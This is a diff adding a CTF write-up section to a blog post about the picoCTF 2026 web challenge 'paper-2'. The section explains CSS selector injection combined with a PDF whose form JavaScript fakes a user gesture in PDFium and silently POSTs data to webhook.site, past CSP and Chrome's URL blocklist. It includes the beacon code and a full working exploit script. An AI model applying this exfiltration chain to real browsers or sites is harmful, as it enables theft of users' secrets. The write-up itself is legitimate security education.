@@ -1,8 +1,8 @@
 ---
 title: 'PicoCTF 2026'
-description: 'hash length extension on a dot product oracle'
+description: 'hash length extension on a dot product oracle, and CSS injection + PDF beacon exfiltration'
 date: 2026-03-20
-tags: ['writeups', 'crypto']
+tags: ['writeups', 'crypto', 'web']
 authors: ['cold']
 image: ./logo.png
 ---
@@ -578,3 +578,403 @@ if __name__ == '__main__':
 The intern's linear algebra argument was solid&mdash;5 equations in 32 unknowns really can't leak a key. The problem was the MAC. Using `sha512(secret || message)` instead of HMAC let us forge hashes for arbitrary extended vectors, turning 5 trusted vectors into as many as we want.
 
 `picoCTF{n0t_so_s3cure_.x_w1th_sh@512_REDACTED}`
+
+
+## web/paper-2
+
+> A piece of paper is a blank canvas, what do you want on yours?
+
+Sequel to the `paper` challenge from corCTF 2025 by ehhthing, where v2 patches all known solutions by blocking external network access from the bot's browser entirely. The solve is CSS injection with PDF JavaScript beacons.
+
+### The server
+
+Bun + Puppeteer + Redis -- upload files, bot visits your page, leak the secret, get the flag. The [full source is in the appendix](#appendix-index-ts) but here's what matters.
+
+`POST /upload` takes any file up to 64KB and stores the content type from the upload verbatim with no validation. `GET /paper/:id` serves it back with that content type, so uploading as `text/html` gives you arbitrary HTML on the challenge origin.
+
+`GET /secret` is where the fun is:
+
+```typescript title=index.ts startLineNumber=128
+'/secret': async (req: BunRequest): Promise<Response> => {
+    const secret = req.cookies.get('secret') || '0123456789abcdef'.repeat(2);
+    const payload = new URL(req.url, 'http://127.0.0.1').searchParams.get('payload') || '';
+
+    return new Response(
+        `<body secret="${secret}">${secret}\n${payload}</body>`,
+        headers('text/html')
+    );
+},
+```
+
+The bot's `secret` cookie gets placed into a `secret` attribute on `<body>`, and the `payload` query parameter is injected **raw** into the HTML with no escaping whatsoever -- full HTML injection via the query string.
+
+`GET /flag` takes a `secret` parameter and compares it against the stored value using `redis.getdel('secret')`, which atomically reads and deletes the key, giving you exactly one shot.
+
+`GET /visit/:id` triggers the bot: it generates a 32-hex-char secret (`randomBytes(16).toString('hex')`), sets it as a `SameSite=Strict` cookie, stores it in Redis with a **60-second TTL**, navigates to our page, and sleeps for 61 seconds. That gives us exactly 60 seconds to exfiltrate and submit.
+
+### The constraints
+
+Every response gets this CSP:
+
+```
+default-src 'self' 'unsafe-inline'; script-src 'none'
+```
+
+`script-src 'none'` means no JS anywhere -- not in uploaded pages, not in injected HTML, nowhere -- but `default-src 'self' 'unsafe-inline'` leaves inline CSS wide open, and same-origin iframes and `<object>` tags are fair game too.
+
+And then there's the Chrome enterprise policy:
+
+```json
+{ "URLBlocklist": ["*"], "URLAllowlist": ["https://web"] }
+```
+
+The bot can't reach any external URL -- not through navigation, not through resource loading, not through anything -- and this is what makes v2 so much harder than v1.
+
+### v1 is dead
+
+The corCTF 2025 v1 solution by Jorian Woltjer used `window.open()` from an attacker-hosted page with CSS to conditionally hide `<object>` elements, counted `window.length` from JS to detect which character matched, and exfiltrated via `navigator.sendBeacon()`. Paper-2 kills both halves of that approach: there's no JS context to count frames from, and no external network to exfiltrate to.
+
+### So how do you get data out?
+
+We need something that can:
+
+1. Detect which CSS selectors matched (which characters of the secret are correct)
+2. Transmit that information to us externally
+3. Do both without JavaScript and without external network access from the page
+
+CSS attribute selectors handle #1 -- `body[secret^="a1"]` matches if the secret starts with `"a1"`, and we can toggle `display: none` / `display: block` on `<object>` tags to conditionally load resources based on which selector matches (the browser won't fetch the `data` URL of a hidden `<object>`).
+
+But #2 and #3 seem impossible, since the page can't run JS and the browser can't reach external URLs. How do you phone home?
+
+### PDFs should not be able to do this
+
+Chrome's built-in PDF viewer (PDFium) has its own JavaScript engine, and when you load a PDF via `<object data="/paper/1" type=application/pdf>`, any JS embedded in it runs in a completely separate context from the HTML page -- the page's CSP doesn't apply, and `this.submitForm()` in PDF JS can make outbound HTTP requests.
+
+But `submitForm` has a user interaction requirement; you're not supposed to be able to call it programmatically, and PDFs definitely should not be making unsolicited outbound network requests. Let's look at why we can anyway.
+
+### Faking a user gesture in PDFium
+
+PDFium's `submitForm` implementation in [`fxjs/cjs_document.cpp`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_document.cpp) checks for a user gesture before allowing the call:
+
+```cpp
+CJS_EventContext* pHandler = pRuntime->GetCurrentEventContext();
+if (!pHandler->IsUserGesture()) {
+    return CJS_Result::Failure(JSMessage::kUserGestureRequiredError);
+}
+```
+
+And [`IsUserGesture()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_event_context.cpp) is:
+
+```cpp
+bool CJS_EventContext::IsUserGesture() const {
+  switch (kind_) {
+    case Kind::kFieldMouseDown:
+    case Kind::kFieldMouseUp:
+    case Kind::kFieldKeystroke:
+      return true;
+    default:
+      return false;
+  }
+}
+```
+
+That's it -- no transient activation token, no propagation tracking from actual input events, no verification that a human did anything. "User gesture" in PDFium just means "the current JS is executing inside an event context whose `kind_` is one of three enum values," and if `kind_ == kFieldKeystroke`, `submitForm` goes through.
+
+So the question is whether we can get code to run in a `kFieldKeystroke` context without any actual user interaction, and it turns out we can: programmatically setting a form field's value triggers the field's keystroke action (`/AA /K`), and that action runs in a `kFieldKeystroke` context. Here's the full call chain through PDFium:
+
+1. **Document opens.** The `/OpenAction` JS runs in a `kDocOpen` context. Our script: `this.getField('q').value = 'x'`
+
+2. **[`CJS_Field::set_value()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_field.cpp)** calls `SetFieldValue()`, which calls `pFormField->SetValue(strArray[0], NotificationOption::kNotify)`. The `kNotify` flag is the key -- it triggers the form's notification system.
+
+3. **[`CPDF_FormField::SetValue()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/core/fpdfdoc/cpdf_formfield.cpp)** with `kNotify` calls `form_->NotifyBeforeValueChange()`, which calls `BeforeValueChange()` on the form notification handler.
+
+4. **[`CPDFSDK_InteractiveForm::BeforeValueChange()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fpdfsdk/cpdfsdk_interactiveform.cpp)** calls `OnKeyStrokeCommit()`, which checks if the field has a `/AA /K` (keystroke) additional action. It does, so it dispatches:
+
+    ```cpp
+    form_fill_env_->DoActionFieldJavaScript(
+        action, CPDF_AAction::kKeyStroke, pFormField, &fa);
+    ```
+
+5. **[`RunFieldJavaScript()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fpdfsdk/cpdfsdk_formfillenvironment.cpp)** calls `context->OnField_Keystroke(...)`, which sets `kind_ = Kind::kFieldKeystroke`.
+
+6. **Our keystroke action JS now runs** in a `kFieldKeystroke` context, so `IsUserGesture()` returns `true` and `submitForm` goes through.
+
+The notification system (`kNotify`) was originally designed for maintaining form consistency -- triggering validation, formatting, and calculations when a field changes -- but it inadvertently creates a privilege escalation path: `kDocOpen` (no gesture) -> programmatic `set_value` -> `kNotify` -> `BeforeValueChange` -> `OnKeyStrokeCommit` -> `/AA /K` action in `kFieldKeystroke` context (gesture!) -> `submitForm` allowed.
+
+### Why CSP and URLBlocklist don't apply either
+
+There are two more layers that should have stopped this, and neither does.
+
+**CSP bypass:** The PDF plugin ([`PdfViewWebPlugin`](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/pdf/pdf_view_web_plugin.cc)) runs as a `blink::WebPlugin` inside a MimeHandlerView guest frame -- a cross-process OOPIF with its own security context, entirely separate from the embedding page. When `submitForm` fires, `PdfViewWebPlugin::SubmitForm()` constructs its own `UrlRequest` and sends it through [`UrlLoader`](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/pdf/loader/url_loader.cc), configured with:
+
+```cpp
+options.grant_universal_access = true;
+```
+
+The request is tagged as `RequestContextType::PLUGIN` / `RequestDestination::kEmbed`, and when `grant_universal_access` is true the URL loader creates a universally-privileged opaque `SecurityOrigin` via `GrantUniversalAccess()`. The Chromium source has a comment: *"When true, omit origin related checks. USE WITH CARE."*
+
+Because the request originates from the plugin's privileged loader rather than the page's document context, the embedding page's CSP headers are never consulted -- `script-src`, `connect-src`, `form-action`, none of them see this request.
+
+**URLBlocklist bypass:** Chrome's enterprise URL blocklist targets navigations and standard frame/resource loads, but the PDF plugin's `submitForm` POST goes through `WebAssociatedURLLoader` with `grant_universal_access` and `RequestContextType::PLUGIN` -- a completely different code path that the policy enforcement doesn't cover.
+
+<Callout variant="important">
+Three separate security boundaries, all bypassed. PDFium thinks this is a user-initiated action (because `kFieldKeystroke`). Chrome's PDF plugin sends it through a privileged URL loader that bypasses CSP. And the enterprise URL blocklist doesn't intercept plugin-level POSTs. The result: a PDF loaded via `<object>` can silently POST to any URL on the internet.
+</Callout>
+
+### The beacon PDF
+
+With all that in mind, the beacon PDF is straightforward -- a minimal PDF-1.7 with an AcroForm containing a text field widget `"q"` that has a `/AA /K` keystroke action, plus an OpenAction that kicks off the chain.
+
+OpenAction JS:
+```javascript
+this.getField('q').value='x';
+```
+
+Keystroke action JS:
+```javascript
+var u=this.URL;
+var i=u.indexOf('?');
+var qs=i>=0?u.substring(i+1):'';
+this.submitForm({cURL:'https://webhook.site/<token>?'+qs,bFDF:false,bEmpty:true,aFields:['q']});
+```
+
+`this.URL` is the URL the PDF was loaded from, so if we load the beacon via `<object data="/paper/1?s=0&d=p&c=a1">`, `this.URL` contains those query params and `submitForm` forwards them to webhook.site. From our exploit script, we just poll webhook.site's API to see what came back.
+
+### Putting it together
+
+The attack chain:
+
+```
+Main page (our HTML, uploaded to /paper/{main_id})
+  +-- <iframe> --> helper page (our HTML, /paper/{helper_id})
+  |     +-- <iframe> --> /secret?payload=<CSS + objects>
+  |           |
+  |           +-- <body secret="a1b2c3...">
+  |           +-- <style>
+  |           |     object { display: none }
+  |           |     body[secret^="a1"] #p1 { display: block }
+  |           |   </style>
+  |           +-- <object id=p1 data="/paper/{beacon}?s=0&d=p&c=a1">
+  |                 +-- PDF opens, OpenAction fires
+  |                       +-- submitForm("https://webhook.site/...?s=0&d=p&c=a1")
+  ...
+  +-- <meta http-equiv="refresh" content="6.5;url=/paper/{next_stage}">
+```
+
+When the bot loads this, `body[secret^="a1"]` matches (assuming the secret starts with `a1`), so `#p1` gets `display: block` and Chrome loads that PDF while all the other objects stay hidden and are never fetched. The PDF phones home, and we learn that stage 0's prefix is `"a1"`.
+
+### Multi-stage exfiltration
+
+The secret is 32 hex characters, and since CSS `^=` and `$=` only match from the start and end of the attribute value (there's no "match at position N" selector), we have to grow the known prefix rightward and suffix leftward, 2 characters at a time from each end:
+
+```
+Stage 0: prefix=""   suffix=""        --> learns first 2 + last 2
+Stage 1: prefix="a1" suffix="90"      --> learns chars 3-4 + 29-30
+...
+Stage 7: all 32 chars known
+```
+
+Each stage has 16 helper pages (one per high hex nibble `0`-`f`), each testing 16 low nibbles for both prefix and suffix directions -- that's 32 `<object>` tags per helper, and across all 16, exactly one prefix and one suffix beacon fires.
+
+Stages are linked by `<meta http-equiv="refresh">` with a 6.5-second delay; after the refresh fires, the bot navigates to the next stage's main page, and we use that window to collect the webhook callbacks and upload the next stage (which needs the newly-known characters in its CSS selectors).
+
+Since upload IDs are sequential (`redis.incr`) and each stage consumes exactly 17 IDs (16 helpers + 1 main), we can predict all future IDs from the beacon's ID and verify after each upload. If another user takes an ID the chain breaks, so use a fresh instance.
+
+Total timing comes out to ~57 seconds across 8 stages, fitting under the 60-second Redis TTL with about 3 seconds to spare.
+
+### Running it
+
+```
+$ python3 solve.py --base-url https://lonely-island.picoctf.net:50239 --insecure
+[+] webhook token: 3bdffef9-a7f8-4952-a6a7-3e3eba116f4d
+[+] beacon pdf: /paper/1
+[+] stage 0 page: /paper/18
+[+] visit response: 200 'visiting!'
+[+] stage 00: prefix=88 suffix=9b (5.74s)
+[+] uploaded stage 1 page: /paper/35
+[+] stage 01: prefix=8817 suffix=419b (6.32s)
+[+] uploaded stage 2 page: /paper/52
+[+] stage 02: prefix=88175f suffix=90419b (7.39s)
+[+] uploaded stage 3 page: /paper/69
+[+] stage 03: prefix=88175f01 suffix=6f90419b (7.15s)
+[+] uploaded stage 4 page: /paper/86
+[+] stage 04: prefix=88175f01f8 suffix=ca6f90419b (7.76s)
+[+] uploaded stage 5 page: /paper/103
+[+] stage 05: prefix=88175f01f844 suffix=8bca6f90419b (8.06s)
+[+] uploaded stage 6 page: /paper/120
+[+] stage 06: prefix=88175f01f844c6 suffix=d68bca6f90419b (7.17s)
+[+] uploaded stage 7 page: /paper/137
+[+] stage 07: prefix=88175f01f844c679 suffix=56d68bca6f90419b (6.88s)
+[+] recovered secret: 88175f01f844c67956d68bca6f90419b
+[+] flag response (200): picoCTF{i_l1ke_frames_on_my_canvas_953d5fff}
+```
+
+<Spoiler label="Full solve.py (click to expand)">
+
+```python title=solve.py
+#!/usr/bin/env python3
+import argparse, concurrent.futures, json, re, ssl, time
+import urllib.error, urllib.parse, urllib.request, uuid
+
+HEX = "0123456789abcdef"
+HEX_PAIRS = [a + b for a in HEX for b in HEX]
+PAIR_SET = set(HEX_PAIRS)
+HELPERS_PER_STAGE = 16
+STAGE_STRIDE = HELPERS_PER_STAGE + 1
+STAGE_COUNT = 8
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl): return None
+    http_error_301 = http_error_302 = http_error_303 = http_error_307 = http_error_308 = \
+        urllib.request.HTTPRedirectHandler.http_error_302
+
+def log(msg): print(msg, flush=True)
+
+def build_opener(insecure):
+    ctx = ssl.create_default_context()
+    if insecure: ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+    return urllib.request.build_opener(NoRedirect(), urllib.request.HTTPSHandler(context=ctx))
+
+def http_text(opener, method, url, *, data=None, headers=None):
+    req = urllib.request.Request(url, data=data, method=method)
+    for k, v in (headers or {}).items(): req.add_header(k, v)
+    try:
+        with opener.open(req, timeout=15) as r: return r.status, dict(r.headers.items()), r.read().decode()
+    except urllib.error.HTTPError as e: return e.code, dict(e.headers.items()), e.read().decode()
+
+def multipart_body(field, fname, ctype, data):
+    b = f"----paper2-{uuid.uuid4().hex}"
+    body = f"--{b}\r\nContent-Disposition: form-data; name=\"{field}\"; filename=\"{fname}\"\r\nContent-Type: {ctype}\r\n\r\n".encode() + data + f"\r\n--{b}--\r\n".encode()
+    return body, b
+
+def upload_bytes(opener, base, data, mime, fname):
+    body, boundary = multipart_body("file", fname, mime, data)
+    s, h, _ = http_text(opener, "POST", urllib.parse.urljoin(base+"/","upload"), data=body, headers={"Content-Type":f"multipart/form-data; boundary={boundary}"})
+    loc = h.get("Location") or h.get("location","")
+    m = re.search(r"/paper/(\d+)", loc)
+    if s not in {301,302,303,307,308} or not m: raise RuntimeError(f"upload failed: {s} {loc!r}")
+    return int(m.group(1))
+
+def create_webhook_token():
+    req = urllib.request.Request("https://webhook.site/token", data=b'{}', method="POST", headers={"Content-Type":"application/json"})
+    with urllib.request.urlopen(req, timeout=15) as r: return json.loads(r.read().decode())["uuid"]
+
+def list_webhook_requests(token):
+    url = f"https://webhook.site/token/{token}/requests?{urllib.parse.urlencode({'sorting':'newest','per_page':50})}"
+    with urllib.request.urlopen(urllib.request.Request(url, headers={"Accept":"application/json"}), timeout=15) as r:
+        return json.loads(r.read().decode())["data"]
+
+def pdf_escape(v): return v.replace("\\","\\\\").replace("(","\\(").replace(")","\\)")
+
+def build_beacon_pdf(token):
+    wb = f"https://webhook.site/{token}"
+    js_open = "this.getField('q').value='x';"
+    js_k = f"var u=this.URL;var i=u.indexOf('?');var qs=i>=0?u.substring(i+1):'';this.submitForm({{cURL:'{wb}?'+qs,bFDF:false,bEmpty:true,aFields:['q']}});"
+    stream = b"BT /F1 12 Tf 72 200 Td (Beacon) Tj ET"
+    objects = [
+        "<< /Type /Catalog /Pages 2 0 R /AcroForm 7 0 R /OpenAction 8 0 R >>",
+        "<< /Type /Pages /Count 1 /Kids [3 0 R] >>",
+        f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 300] /Resources << /Font << /F1 5 0 R >> >> /Annots [6 0 R] /Contents 4 0 R >>",
+        f"<< /Length {len(stream)} >>\nstream\n{stream.decode()}\nendstream",
+        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
+        f"<< /Type /Annot /Subtype /Widget /FT /Tx /T (q) /Rect [50 50 250 80] /P 3 0 R /F 4 /DA (/F1 12 Tf 0 g) /AA << /K << /S /JavaScript /JS ({pdf_escape(js_k)}) >> >> >>",
+        "<< /Fields [6 0 R] >>",
+        f"<< /S /JavaScript /JS ({pdf_escape(js_open)}) >>",
+    ]
+    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"); offsets = [0]
+    for i, obj in enumerate(objects, 1): offsets.append(len(out)); out.extend(f"{i} 0 obj\n{obj}\nendobj\n".encode())
+    sx = len(out); out.extend(f"xref\n0 {len(objects)+1}\n".encode()); out.extend(b"0000000000 65535 f \n")
+    for o in offsets[1:]: out.extend(f"{o:010d} 00000 n \n".encode())
+    out.extend(f"trailer\n<< /Size {len(objects)+1} /Root 1 0 R >>\nstartxref\n{sx}\n%%EOF\n".encode())
+    return bytes(out)
+
+def build_helper_page(secret_url):
+    return f'<!doctype html><iframe src="{secret_url}" width="1" height="1" style="border:0"></iframe>'.encode()
+
+def build_helper_page_for_hi(prefix, suffix, hi, beacon_id, stage):
+    parts = ["<style>object{display:none}"]
+    for lo in HEX: parts.append(f'body[secret^="{prefix}{hi}{lo}"] #p{lo}{{display:block}}')
+    for lo in HEX: parts.append(f'body[secret$="{hi}{lo}{suffix}"] #s{lo}{{display:block}}')
+    parts.append("</style>")
+    for lo in HEX:
+        v = hi+lo
+        parts.append(f'<object id=p{lo} data="/paper/{beacon_id}?{urllib.parse.urlencode({"s":stage,"d":"p","c":v})}" type=application/pdf width=1 height=1></object>')
+        parts.append(f'<object id=s{lo} data="/paper/{beacon_id}?{urllib.parse.urlencode({"s":stage,"d":"s","c":v})}" type=application/pdf width=1 height=1></object>')
+    return build_helper_page("/secret?" + urllib.parse.urlencode({"payload":"".join(parts)}))
+
+def build_main_stage_page(helper_ids, next_main_id, delay):
+    html = ["<!doctype html>"]
+    if next_main_id is not None:
+        d = f"{delay:.2f}".rstrip("0").rstrip(".")
+        html.append(f'<meta http-equiv="refresh" content="{d};url=/paper/{next_main_id}">')
+    for hid in helper_ids: html.append(f'<iframe src="/paper/{hid}" width="1" height="1" style="border:0"></iframe>')
+    return "".join(html).encode()
+
+def upload_stage_batch(opener, base, prefix, suffix, beacon_id, stage, exp_first, next_main, delay):
+    helper_ids, observed = {}, set()
+    def upload_helper(hi):
+        return hi, upload_bytes(opener, base, build_helper_page_for_hi(prefix,suffix,hi,beacon_id,stage), "text/html", f"s{stage}-{hi}.html")
+    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as pool:
+        for f in concurrent.futures.as_completed([pool.submit(upload_helper,h) for h in HEX]):
+            hi, hid = f.result(); observed.add(hid); helper_ids[hi] = hid
+    expected = set(range(exp_first, exp_first+HELPERS_PER_STAGE))
+    if observed != expected: raise RuntimeError(f"id mismatch: {sorted(observed)} != {sorted(expected)}")
+    exp_main = exp_first + HELPERS_PER_STAGE
+    main_id = upload_bytes(opener, base, build_main_stage_page([helper_ids[h] for h in HEX], next_main, delay), "text/html", f"stage{stage}.html")
+    if main_id != exp_main: raise RuntimeError(f"main id {main_id} != {exp_main}")
+    return main_id
+
+def wait_for_stage(token, seen, stage, timeout, poll):
+    deadline = time.monotonic() + timeout; pv = sv = ""
+    while time.monotonic() < deadline:
+        for item in reversed(list_webhook_requests(token)):
+            rid = item["uuid"]
+            if rid in seen: continue
+            seen.add(rid); q = item.get("query") or {}
+            if str(q.get("s")) != str(stage): continue
+            d, c = q.get("d"), q.get("c")
+            if c not in PAIR_SET: continue
+            if d == "p": pv = c
+            elif d == "s": sv = c
+        if pv and sv: return pv, sv
+        time.sleep(poll)
+    raise TimeoutError(f"stage {stage}: prefix={pv!r} suffix={sv!r}")
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--base-url", required=True); ap.add_argument("--insecure", action="store_true")
+    ap.add_argument("--initial-delay", type=float, default=5.0); ap.add_argument("--delay", type=float, default=6.5)
+    ap.add_argument("--poll-timeout", type=float, default=15.0); ap.add_argument("--poll-interval", type=float, default=0.1)
+    ap.add_argument("--webhook-token")
+    args = ap.parse_args(); opener = build_opener(args.insecure); base = args.base_url.rstrip("/")
+    token = args.webhook_token or create_webhook_token(); log(f"[+] webhook token: {token}")
+    beacon_id = upload_bytes(opener, base, build_beacon_pdf(token), "application/pdf", "beacon.pdf")
+    log(f"[+] beacon pdf: /paper/{beacon_id}")
+    prefix = suffix = ""
+    cur = upload_stage_batch(opener, base, prefix, suffix, beacon_id, 0, beacon_id+1,
+        beacon_id+(2*STAGE_STRIDE) if STAGE_COUNT>1 else None, args.initial_delay)
+    log(f"[+] stage 0 page: /paper/{cur}")
+    s, _, body = http_text(opener, "GET", urllib.parse.urljoin(base+"/", f"visit/{cur}"))
+    log(f"[+] visit response: {s} {body.strip()!r}")
+    if "visiting!" not in body: raise RuntimeError(f"visit failed: {s} {body!r}")
+    seen = set()
+    for stage in range(STAGE_COUNT):
+        t0 = time.monotonic(); pv, sv = wait_for_stage(token, seen, stage, args.poll_timeout, args.poll_interval)
+        prefix += pv; suffix = sv + suffix
+        log(f"[+] stage {stage:02d}: prefix={prefix} suffix={suffix} ({time.monotonic()-t0:.2f}s)")
+        if stage == STAGE_COUNT-1: break
+        nf = cur+1; nm = cur+STAGE_STRIDE; fm = nm+STAGE_STRIDE if stage < STAGE_COUNT-2 else None
+        cur = upload_stage_batch(opener, base, prefix, suffix, beacon_id, stage+1, nf, fm, args.delay)
+        if cur != nm: raise RuntimeError(f"stage id {cur} != {nm}")
+        log(f"[+] uploaded stage {stage+1} page: /paper/{cur}")
+    secret = prefix + suffix; log(f"[+] recovered secret: {secret}")
+    s, _, flag = http_text(opener, "GET", urllib.parse.urljoin(base+"/", "flag?"+urllib.parse.urlencode({"secret":secret})))
+    log(f"[+] flag response ({s}): {flag.strip()}")
+    return 0
+
+if __name__ == "__main__": raise SystemExit(main())
+```
+
+</Spoiler>
+
+`picoCTF{i_l1ke_frames_on_my_canvas_953d5fff}`
